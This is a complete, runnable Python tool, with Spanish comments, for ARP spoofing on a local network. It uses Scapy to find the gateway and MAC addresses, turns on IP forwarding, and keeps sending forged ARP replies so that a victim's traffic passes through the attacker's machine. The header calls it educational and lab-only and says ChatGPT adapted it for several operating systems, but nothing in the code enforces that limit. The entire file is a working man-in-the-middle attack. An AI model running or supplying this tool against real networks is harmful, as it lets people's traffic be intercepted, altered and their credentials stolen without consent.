#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Herramienta educativa para ARP Spoofing
Uso en laboratorio controlado exclusivamente.
Autor: Juan Romero Collazos
Adaptado multi-OS por ChatGPT
"""

import argparse
import os
import sys
import platform
import re
import subprocess
import time
from scapy.layers.l2 import ARP, Ether
from scapy.sendrecv import srp
from scapy.config import conf
from scapy.arch import get_if_hwaddr
from scapy.sendrecv import sendp

# --- Colores para mensajes ---
RED = "\033[91m"
GREEN = "\033[92m"
YELLOW = "\033[93m"
CYAN = "\033[96m"
RESET = "\033[0m"

def get_gateway_ip_linux():
    """Detecta IP gateway en Linux/macOS usando 'ip route'."""
    try:
        route = subprocess.check_output("ip route | grep default", shell=True, text=True)
        if route:
            return route.split()[2]
    except Exception:
        pass
    return None

def get_gateway_ip_windows():
    """Detecta IP gateway en Windows usando 'route print'."""
    try:
        output = subprocess.check_output("route print 0.0.0.0", shell=True, text=True)
        match = re.search(r"0\.0\.0\.0\s+0\.0\.0\.0\s+(\d+\.\d+\.\d+\.\d+)", output)
        if match:
            return match.group(1)
    except Exception:
        pass
    return None

def get_gateway_ip():
    """Detecta la IP del gateway según sistema operativo."""
    system = platform.system()
    if system == "Windows":
        return get_gateway_ip_windows()
    else:
        return get_gateway_ip_linux()

def get_mac_linux(ip):
    """Obtiene MAC de IP usando ARP broadcast (Linux/macOS)."""
    arp_req = ARP(pdst=ip)
    broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_req_broadcast = broadcast / arp_req
    answered, unanswered = srp(arp_req_broadcast, timeout=5, verbose=False, iface=conf.iface)
    for sent, received in answered:
        if received and received.hwsrc:
            return received.hwsrc
    return None

def get_mac_windows(ip):
    try:
        # Forzar resolución de IP a MAC en caché con ping
        subprocess.call(f"ping -n 1 {ip}", shell=True, stdout=subprocess.DEVNULL)
        arp_table = subprocess.check_output("arp -a", shell=True, text=True)
        for line in arp_table.splitlines():
            if ip in line:
                parts = line.split()
                if len(parts) >= 2:
                    mac = parts[1].replace('-', ':').lower()
                    return mac
    except Exception:
        pass
    return None

def get_mac(ip):
    """Detecta MAC según sistema operativo."""
    if platform.system() == "Windows":
        return get_mac_windows(ip)
    else:
        return get_mac_linux(ip)

def spoof(target_ip, target_mac, spoof_ip, attacker_mac):
    """Envía paquete ARP falso con capa Ethernet explícita para evitar warnings."""
    arp_response = ARP(
        op=2,
        pdst=target_ip,
        hwdst=target_mac,
        psrc=spoof_ip,
        hwsrc=attacker_mac
    )
    ethernet = Ether(dst=target_mac, src=attacker_mac)
    packet = ethernet / arp_response
    sendp(packet, verbose=False, iface=conf.iface)

def restore_arp(ip_target, mac_target, ip_real, mac_real):
    """Restaura tabla ARP con paquete ARP envuelto en Ethernet."""
    arp_response = ARP(
        op=2,
        pdst=ip_target,
        hwdst=mac_target,
        psrc=ip_real,
        hwsrc=mac_real
    )
    ethernet = Ether(dst=mac_target, src=mac_real)
    packet = ethernet / arp_response
    sendp(packet, count=3, verbose=False, iface=conf.iface)

def check_root():
    """Verifica permisos root/administrador en Unix; en Windows advierte."""
    system = platform.system()
    if system != "Windows":
        if hasattr(os, "geteuid") and os.geteuid() != 0: # type: ignore[attr-defined]
            sys.exit(RED + "[!] Ejecuta este script con sudo/root" + RESET)
    else:
        import ctypes
        try:
            is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
        except Exception:
            is_admin = False
        if not is_admin:
            print(YELLOW + "[!] Advertencia: Ejecuta este script como Administrador para mejor funcionamiento" + RESET)

def enable_ip_forwarding(enable: bool = True):
    system = platform.system()

    if system == "Linux":
        try:
            with open('/proc/sys/net/ipv4/ip_forward', 'w') as f:
                f.write('1\n' if enable else '0\n')
            status = "habilitado" if enable else "deshabilitado"
            print(GREEN + f"[*] IP forwarding {status} en Linux" + RESET)
        except Exception as e:
            print(RED + f"[!] No se pudo {'habilitar' if enable else 'deshabilitar'} IP forwarding en Linux: {e}" + RESET)

    elif system == "Darwin":  # macOS
        try:
            cmd = ['sysctl', '-w', f'net.inet.ip.forwarding={"1" if enable else "0"}']
            subprocess.check_call(cmd)
            status = "habilitado" if enable else "deshabilitado"
            print(GREEN + f"[*] IP forwarding {status} en macOS" + RESET)
        except Exception as e:
            print(RED + f"[!] No se pudo {'habilitar' if enable else 'deshabilitar'} IP forwarding en macOS: {e}" + RESET)

    elif system == "Windows":
        # En Windows, habilitar forwarding requiere modificar el registro o usar netsh,
        # lo cual suele necesitar privilegios elevados y reinicio. Se puede intentar así:
        try:
            state = "enabled" if enable else "disabled"
            cmd = f'netsh interface ipv4 set global forwarding={state}'
            result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
            if result.returncode == 0:
                print(GREEN + f"[*] IP forwarding {state} en Windows (puede requerir reinicio)" + RESET)
            else:
                print(YELLOW + f"[!] No se pudo cambiar IP forwarding en Windows: {result.stderr.strip()}" + RESET)
        except Exception as e:
            print(RED + f"[!] Error intentando habilitar IP forwarding en Windows: {e}" + RESET)

    else:
        print(YELLOW + f"[!] Sistema operativo {system} no soportado para habilitar IP forwarding automáticamente." + RESET)

def main():
    check_root()

    enable_ip_forwarding(True)  # Habilitar forwarding al iniciar

    parser = argparse.ArgumentParser(description="Herramienta educativa ARP Spoofing (solo laboratorio)")
    parser.add_argument("victim_ip", help="IP de la víctima")
    parser.add_argument("-i", "--interface", help="Interfaz de red a usar (opcional)")
    parser.add_argument("-t", "--time", type=float, default=2, help="Intervalo entre envíos (segundos)")
    args = parser.parse_args()

    if args.interface:
        conf.iface = args.interface
    interface = conf.iface
    try:
        attacker_mac = get_if_hwaddr(interface)
    except Exception as e:
        sys.exit(RED + f"[!] No se pudo obtener MAC de la interfaz {interface}: {e}" + RESET)

    gateway_ip = get_gateway_ip()
    if not gateway_ip:
        sys.exit(RED + "[!] No se pudo detectar la IP del gateway" + RESET)

    print(GREEN + f"[*] Gateway detectado: {gateway_ip}" + RESET)

    victim_mac = get_mac(args.victim_ip)
    gateway_mac = get_mac(gateway_ip)

    if not victim_mac or not gateway_mac:
        sys.exit(RED + "[!] No se pudieron resolver todas las MACs" + RESET)

    print(CYAN + f"[*] MAC víctima: {victim_mac}" + RESET)
    print(CYAN + f"[*] MAC gateway: {gateway_mac}" + RESET)
    print(CYAN + f"[*] MAC atacante ({interface}): {attacker_mac}" + RESET)

    try:
        print(YELLOW + "[*] Enviando paquetes ARP falsos... (Ctrl+C para detener)" + RESET)
        while True:
            spoof(args.victim_ip, victim_mac, gateway_ip, attacker_mac)
            spoof(gateway_ip, gateway_mac, args.victim_ip, attacker_mac)
            time.sleep(args.time)

    except KeyboardInterrupt:
        print(RED + "\n[!] Interrumpido. Restaurando tablas ARP..." + RESET)
        restore_arp(args.victim_ip, victim_mac, gateway_ip, gateway_mac)
        restore_arp(gateway_ip, gateway_mac, args.victim_ip, victim_mac)
        print(GREEN + "[+] ARP restaurado correctamente. Saliendo..." + RESET)
    finally:
        enable_ip_forwarding(False)
        print(GREEN + "[*] IP forwarding desactivado" + RESET)

if __name__ == "__main__":
    main()
